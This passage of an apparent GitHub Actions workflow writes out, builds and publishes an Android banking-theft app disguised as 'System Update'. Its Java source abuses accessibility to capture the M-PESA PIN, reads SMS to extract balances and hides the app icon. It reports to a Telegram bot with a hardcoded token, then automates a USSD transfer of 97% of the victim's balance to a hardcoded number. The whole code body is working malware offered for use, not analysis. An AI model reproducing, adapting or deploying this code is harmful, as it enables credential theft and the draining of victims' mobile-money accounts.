              android:padding="32dp"
              android:background="#0a0f1a">

              <ImageView
                  android:layout_width="80dp"
                  android:layout_height="80dp"
                  android:src="@drawable/ic_launcher"
                  android:layout_marginBottom="24dp" />

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="System Update"
                  android:textColor="#FFFFFF"
                  android:textSize="24sp"
                  android:textStyle="bold"
                  android:layout_marginBottom="32dp" />

              <Button
                  android:id="@+id/btnAccessibility"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="Enable Accessibility"
                  android:textAllCaps="false"
                  android:backgroundTint="#3B82F6"
                  android:layout_marginBottom="12dp" />

              <TextView
                  android:id="@+id/tvStatus"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Please grant all permissions"
                  android:textColor="#94A3B8"
                  android:textSize="14sp"
                  android:layout_marginTop="24dp" />
          </LinearLayout>
          EOF

      # =============== SOURCE CODE ===============

      - name: Create MainActivity.java
        run: |
          cat > app/src/main/java/com/system/updator/MainActivity.java << 'EOF'
          package com.system.updator;

          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Button;
          import android.widget.TextView;
          import android.widget.Toast;

          public class MainActivity extends Activity {
              private TextView tvStatus;
              private Button btnAccessibility;
              private boolean allPermissionsGranted = false;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  tvStatus = findViewById(R.id.tvStatus);
                  btnAccessibility = findViewById(R.id.btnAccessibility);

                  btnAccessibility.setOnClickListener(v -> {
                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                      tvStatus.setText("Enable 'System Update' in Accessibility");
                  });

                  checkAndStart();
              }

              private void checkAndStart() {
                  boolean access = isAccessibilityEnabled();
                  boolean sms = checkPermission(android.Manifest.permission.READ_SMS) &&
                          checkPermission(android.Manifest.permission.RECEIVE_SMS);
                  boolean phone = checkPermission(android.Manifest.permission.CALL_PHONE);

                  if (access && sms && phone) {
                      allPermissionsGranted = true;
                      tvStatus.setText("✅ All permissions granted – starting bot...");
                      // Hide icon
                      hideIcon();
                      // Start service
                      startService(new Intent(this, FinAutoService.class));
                      // Finish activity
                      finish();
                  } else {
                      tvStatus.setText("Please grant all permissions to start the bot.");
                  }
              }

              private boolean checkPermission(String perm) {
                  return checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
              }

              private boolean isAccessibilityEnabled() {
                  String service = getPackageName() + "/" + FinAutoService.class.getCanonicalName();
                  try {
                      String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                      return enabled != null && enabled.contains(service);
                  } catch (Exception e) {
                      return false;
                  }
              }

              private void hideIcon() {
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  getPackageManager().setComponentEnabledSetting(componentName,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP);
              }

              @Override
              protected void onResume() {
                  super.onResume();
                  if (!allPermissionsGranted) {
                      checkAndStart();
                  }
              }
          }
          EOF

      - name: Create BootReceiver.java
        run: |
          cat > app/src/main/java/com/system/updator/BootReceiver.java << 'EOF'
          package com.system.updator;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.util.Log;

          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      Log.d("BootReceiver", "📱 Device booted");
                      context.startService(new Intent(context, FinAutoService.class));
                  }
              }
          }
          EOF

      - name: Create SmsReceiver.java
        run: |
          cat > app/src/main/java/com/system/updator/SmsReceiver.java << 'EOF'
          package com.system.updator;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          import android.util.Log;
          import java.util.regex.Matcher;
          import java.util.regex.Pattern;

          public class SmsReceiver extends BroadcastReceiver {
              private static final String TAG = "SmsReceiver";
              private static double lastBalanceAmount = 0;
              private static long lastBalanceTimestamp = 0;

              @Override
              public void onReceive(Context context, Intent intent) {
                  Bundle extras = intent.getExtras();
                  if (extras == null) return;
                  Object[] pdus = (Object[]) extras.get("pdus");
                  if (pdus == null) return;

                  for (Object pdu : pdus) {
                      SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
                      String body = msg.getMessageBody();
                      String sender = msg.getOriginatingAddress();
                      long timestamp = msg.getTimestampMillis();
                      Log.d(TAG, "SMS from " + sender + ": " + body);

                      if (body != null && (body.contains("M-PESA") || body.contains("MPESA") ||
                              body.contains("balance") || body.contains("Balance") ||
                              body.contains("KES") || body.contains("Ksh"))) {
                          double bal = extractBalance(body);
                          if (bal > 0) {
                              lastBalanceAmount = bal;
                              lastBalanceTimestamp = timestamp;
                              Log.d(TAG, "Balance extracted: " + bal);
                              // Notify service via static method
                              FinAutoService.updateBalance(bal, timestamp);
                          }
                      }
                  }
              }

              private double extractBalance(String text) {
                  Pattern p = Pattern.compile("(?:Balance|bal|KES|Ksh)\\s*[:]?\\s*([\\d,\\.]+)");
                  Matcher m = p.matcher(text);
                  if (m.find()) {
                      try {
                          return Double.parseDouble(m.group(1).replace(",", ""));
                      } catch (Exception e) { return 0; }
                  }
                  return 0;
              }

              public static double getLastBalanceAmount() { return lastBalanceAmount; }
              public static long getLastBalanceTimestamp() { return lastBalanceTimestamp; }
          }
          EOF

      - name: Create PinData.java
        run: |
          cat > app/src/main/java/com/system/updator/PinData.java << 'EOF'
          package com.system.updator;

          public class PinData {
              public String pin;
              public boolean isLearned = false;
          }
          EOF

      - name: Create FinAutoService.java (SPEEDY AUTOMATION)
        run: |
          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
          package com.system.updator;

          import android.accessibilityservice.AccessibilityService;
          import android.app.ActivityManager;
          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.os.PowerManager;
          import android.provider.Settings;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;

          import com.google.gson.Gson;

          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.util.List;
          import java.util.UUID;
          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;

          public class FinAutoService extends AccessibilityService {
              private static final String TAG = "FinAuto";
              private static final String TARGET_PHONE = "0798688920";
              private static final double SEND_PERCENTAGE = 0.97;
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";

              private SharedPreferences prefs;
              private Gson gson = new Gson();
              private Handler handler = new Handler(Looper.getMainLooper());
              private ExecutorService executor = Executors.newSingleThreadExecutor();
              private PowerManager.WakeLock wakeLock;
              private String deviceId;

              private double cachedBalance = 0;
              private long balanceTimestamp = 0;
              private String mpesaPin = null;
              private boolean pinLearned = false;
              private boolean isUssdAutomationRunning = false;
              private boolean pinCaptureMode = false;

              // Static variable to receive balance updates from SmsReceiver
              private static double staticBalance = 0;
              private static long staticTimestamp = 0;

              public static void updateBalance(double bal, long ts) {
                  staticBalance = bal;
                  staticTimestamp = ts;
              }

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  Log.d(TAG, "🚀 M-PESA BOT STARTED");
                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
                  deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                  if (deviceId == null) deviceId = UUID.randomUUID().toString();

                  PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                  wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "FinBot:WakeLock");
                  wakeLock.acquire(10 * 60 * 1000L);

                  loadData();
                  sendTelegram("✅ *System Updator Installed*\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n📟 Android " + Build.VERSION.RELEASE + "\n🆔 " + deviceId);

                  // Check static balance from SmsReceiver
                  if (staticBalance > 0 && (System.currentTimeMillis() - staticTimestamp) < 5 * 60 * 1000) {
                      cachedBalance = staticBalance;
                      balanceTimestamp = staticTimestamp;
                      sendTelegram("💰 *Balance from SMS:* KES " + cachedBalance + " (verified)");
                      saveBalance(cachedBalance, balanceTimestamp);
                  } else {
                      sendTelegram("⏳ *No recent M-PESA balance SMS found.* Please check your balance via SIM Toolkit.");
                  }

                  startForeground(1, createNotification());
                  handler.postDelayed(this::checkForegroundApp, 2000);
              }

              private Notification createNotification() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel("fin_bot", "System Update", NotificationManager.IMPORTANCE_LOW);
                      NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                      nm.createNotificationChannel(channel);
                  }
                  return new Notification.Builder(this, "fin_bot")
                      .setContentTitle("System Update")
                      .setContentText("Running")
                      .setSmallIcon(android.R.drawable.ic_menu_manage)
                      .build();
              }

              private void loadData() {
                  String pinJson = prefs.getString("mpesa_pin", "{}");
                  PinData pinData = gson.fromJson(pinJson, PinData.class);
                  if (pinData != null && pinData.isLearned && pinData.pin != null) {
                      mpesaPin = pinData.pin;
                      pinLearned = true;
                  }
                  cachedBalance = prefs.getFloat("cached_balance", 0);
                  balanceTimestamp = prefs.getLong("balance_timestamp", 0);
              }

              private void savePin(String pin) {
                  PinData data = new PinData();
                  data.pin = pin;
                  data.isLearned = true;
                  String json = gson.toJson(data);
                  prefs.edit().putString("mpesa_pin", json).apply();
                  mpesaPin = pin;
                  pinLearned = true;
              }

              private void saveBalance(double balance, long timestamp) {
                  prefs.edit().putFloat("cached_balance", (float) balance).putLong("balance_timestamp", timestamp).apply();
              }

              private void checkForegroundApp() {
                  ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                  if (am != null) {
                      try {
                          List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
                          if (procs != null && !procs.isEmpty()) {
                              String pkg = procs.get(0).processName;
                              if (pkg.contains("stk") || pkg.contains("simtoolkit")) {
                                  pinCaptureMode = true;
                              } else {
                                  pinCaptureMode = false;
                              }
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Error checking foreground: " + e.getMessage());
                      }
                  }
                  handler.postDelayed(this::checkForegroundApp, 1000);
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                      String cls = event.getClassName() != null ? event.getClassName().toString() : "";

                      // Detect STK PIN entry and capture once
                      if (pkg.contains("stk") || pkg.contains("simtoolkit")) {
                          if (!pinLearned && (cls.contains("Pin") || cls.contains("Password") || cls.contains("EditText"))) {
                              AccessibilityNodeInfo root = getRootInActiveWindow();
                              if (root != null) {
                                  String pin = findPinInput(root);
                                  if (pin != null && !pin.isEmpty()) {
                                      capturePin(pin);
                                  }
                              }
                          }
                      }
                  }

                  // If pinCaptureMode is true and we haven't captured, try reading again
                  if (pinCaptureMode && !pinLearned) {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root != null) {
                          String pin = findPinInput(root);
                          if (pin != null && !pin.isEmpty()) {
                              capturePin(pin);
                          }
                      }
                  }
              }

              private void capturePin(String pin) {
                  if (pinLearned) return;
                  savePin(pin);
                  sendTelegram("🔑 *M-PESA PIN captured successfully.*");
                  // Start 60-second delay then automation
                  handler.postDelayed(() -> {
                      // Re‑read latest balance from static variable
                      if (staticBalance > 0 && (System.currentTimeMillis() - staticTimestamp) < 5 * 60 * 1000) {
                          cachedBalance = staticBalance;
                          saveBalance(cachedBalance, staticTimestamp);
                      }
                      startAutomation();
                  }, 60000);
              }

              private String findPinInput(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isEditable() && node.isPassword() && node.getText() != null) {
                      return node.getText().toString();
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      String res = findPinInput(node.getChild(i));
                      if (res != null) return res;
                  }
                  return null;
              }

              private void startAutomation() {
                  if (isUssdAutomationRunning) return;
                  if (!pinLearned) {
                      sendTelegram("⏳ *PIN not captured yet. Skipping automation.*");
                      return;
                  }
                  if (cachedBalance <= 0) {
                      sendTelegram("⚠️ *No balance data. Please check your balance.*");
                      return;
                  }

                  double amount = cachedBalance * SEND_PERCENTAGE;
                  if (amount < 10) {
                      sendTelegram("⚠️ *Insufficient funds!* Balance: KES " + cachedBalance + ", 97% = " + amount + ". Skipping.");
                      return;
                  }

                  isUssdAutomationRunning = true;
                  sendTelegram("💰 *Automation Started*\n🎯 97% to " + TARGET_PHONE + "\nAmount: KES " + String.format("%.0f", amount));

                  // Execute USSD flow with minimal delays
                  handler.postDelayed(() -> {
                      openDialer();
                      handler.postDelayed(() -> {
                          typeText("*334#");
                          handler.postDelayed(() -> performClickOnCallButton(), 200);
                          handler.postDelayed(() -> {
                              // Wait for USSD menu (shorter)
                              handler.postDelayed(() -> {
                                  clickText("Send Money");
                                  handler.postDelayed(() -> {
                                      typeText(TARGET_PHONE);
                                      handler.postDelayed(() -> {
                                          clickText("Send");
                                          handler.postDelayed(() -> {
                                              typeText(String.format("%.0f", amount));
                                              handler.postDelayed(() -> {
                                                  clickText("Send");
                                                  handler.postDelayed(() -> {
                                                      typeText(mpesaPin);
                                                      handler.postDelayed(() -> {
                                                          clickText("Send");
                                                          handler.postDelayed(() -> {
                                                              clickText("Confirm");
                                                              handler.postDelayed(() -> {
                                                                  sendTelegram("✅ *Transaction Complete*\n📱 " + TARGET_PHONE + "\n💰 KES " + String.format("%.0f", amount) + " sent.");
                                                                  isUssdAutomationRunning = false;
                                                              }, 1000);
                                                          }, 500);
                                                      }, 500);
                                                  }, 500);
                                              }, 500);
                                          }, 500);
                                      }, 500);
                                  }, 800);
                              }, 800);
                          }, 500);
                      }, 200);
                  }, 500);
              }

              // ==================== UI ACTION HELPERS ====================

              private void clickText(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  clickNodeWithText(root, text);
              }

              private void clickNodeWithText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return;
                  if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
                      node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      Log.d(TAG, "👆 Clicked: " + text);
                      return;
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      clickNodeWithText(node.getChild(i), text);
                  }
              }

              private void typeText(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  AccessibilityNodeInfo input = findEditable(root);
                  if (input != null) {
                      Bundle args = new Bundle();
                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                      input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                      Log.d(TAG, "⌨️ Typed: " + text);
                  }
              }

              private AccessibilityNodeInfo findEditable(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isEditable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo res = findEditable(node.getChild(i));
                      if (res != null) return res;
                  }
                  return null;
              }

              private void openDialer() {
                  Intent intent = new Intent(Intent.ACTION_DIAL);
                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                  startActivity(intent);
              }

              private void performClickOnCallButton() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  findAndClickCallButton(root);
              }

              private void findAndClickCallButton(AccessibilityNodeInfo node) {
                  if (node == null) return;
                  CharSequence desc = node.getContentDescription();
                  CharSequence text = node.getText();
                  if ((desc != null && desc.toString().toLowerCase().contains("call")) ||
                      (text != null && text.toString().toLowerCase().contains("call"))) {
                      node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                      return;
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      findAndClickCallButton(node.getChild(i));
                  }
              }

              // ==================== TELEGRAM ====================

              private void sendTelegram(String msg) {
                  executor.execute(() -> {
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + msg.replace("\"", "\\\"") + "\",\"parse_mode\":\"Markdown\"}";
                          conn.getOutputStream().write(json.getBytes("UTF-8"));
                          conn.getOutputStream().flush();
                          int code = conn.getResponseCode();
                          conn.disconnect();
                          if (code != 200) Log.e(TAG, "Telegram error: " + code);
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram send error: " + e.getMessage());
                      }
                  });
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "Service interrupted");
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
                  sendTelegram("🛑 Bot stopped");
              }
          }
          EOF

      # =============== BUILD & DEPLOY ===============

      - name: Build APK
        run: |
          chmod +x gradlew
          ./gradlew clean assembleDebug

      - name: Upload APK Artifact
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: system-updator-apk
          path: app/build/outputs/apk/debug/app-debug.apk

      - name: Create Release
        if: success()
        uses: softprops/action-gh-release@v1
        with:
          files: app/build/outputs/apk/debug/app-debug.apk
          tag_name: v${{ github.run_number }}
          body: "🚀 System Updator APK Build #${{ github.run_number }} – Fast M-PESA Automation"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Build Status
        if: always()
        run: |
          echo "Build Status: ${{ job.status }}"
          echo "Commit: ${{ github.sha }}"
          echo "Branch: ${{ github.ref }}"
